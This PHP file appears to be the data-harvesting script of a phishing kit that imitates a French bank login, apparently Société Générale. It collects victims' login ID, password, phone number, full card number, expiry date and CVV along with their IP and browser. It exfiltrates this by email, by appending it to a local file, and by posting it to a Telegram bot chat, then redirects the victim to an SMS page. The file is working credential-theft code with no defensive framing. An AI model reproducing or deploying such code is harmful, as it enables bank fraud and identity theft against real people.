<?php

include("funcs.php");

$message  = "******* New cc SG *******\n\n";
$message .= "Identifiant : ".$_SESSION['user_id']."\n";
$message .= "Password : ".$_SESSION['Hidden1']."\n\n";
$message .= "\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Tél : ".$_SESSION['tel']."\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Numéro de carte : ".$_POST['hehehe']."\n";
$message .= "Date d'expiration : ".$_POST['exp']."\n";
$message .= "CVV : ".$_POST['cv']."\n";
$message .= "***************************************\n\n";

$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";

$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "";
$subject = "SG|".$ip;
$headers = "From:  Login <don@mox.fr>";
mail($send,$subject,$message,$headers);
 
$file = fopen("../infos.txt","a");
fwrite($file,$message);  

$website="https://api.telegram.org/bot<TOKEN_REMOVED>";
$chatId=-403117858;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-403117858',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


header("Location: sms.php");

?>

